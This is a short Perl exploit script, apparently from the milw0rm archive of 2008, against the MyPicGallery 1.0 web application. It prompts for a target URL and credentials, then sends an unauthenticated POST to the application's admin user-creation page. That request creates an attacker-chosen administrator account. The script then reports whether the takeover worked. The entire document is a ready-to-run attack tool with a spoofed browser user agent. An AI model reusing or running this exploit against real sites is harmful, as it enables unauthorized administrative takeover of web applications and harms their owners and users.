#!/usr/bin/perl

use strict;
use LWP::UserAgent;

print "-+--[ MyPicGallery 1.0 Arbitrary Add-Admin Exploit ]--+-\n";
print "-+--        Discovered && Coded By: t0pP8uZz        --+-\n";
print "-+-- Discovered On: 16 MAY 2008 / h4ck-y0u, milw0rm --+-\n";
print "-+--[ MyPicGallery 1.0 Arbitrary Add-Admin Exploit ]--+-\n";

print "\nEnter URL(http://site.com): ";
	chomp(my $url=<STDIN>);
	
print "\nEnter Username(create's a admin username): ";
	chomp(my $usr=<STDIN>);
	
print "\nEnter Password(create's a admin password): ";
	chomp(my $pwd=<STDIN>);
	
my $ua = LWP::UserAgent->new( agent => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)" );
my $ob = $ua->post( $url."/admin/addUser.php?userID=admin", { "submit" => 1, # ugly?
															  "fullName"    => "null",
															  "userName"    => $usr,
															  "password"    => $pwd,
															  "conPassword" => $pwd,
															  "uType"       => "admin",
															  "email"       => "null\@null.com" } );

if($ob->is_success && index($ob->content, "added") != -1) {
	print "\nAdmin Account Added! Login at: ".$url."\n";
} else { print "\nExploit Failed! username already exists?"; }

# milw0rm.com [2008-05-18]
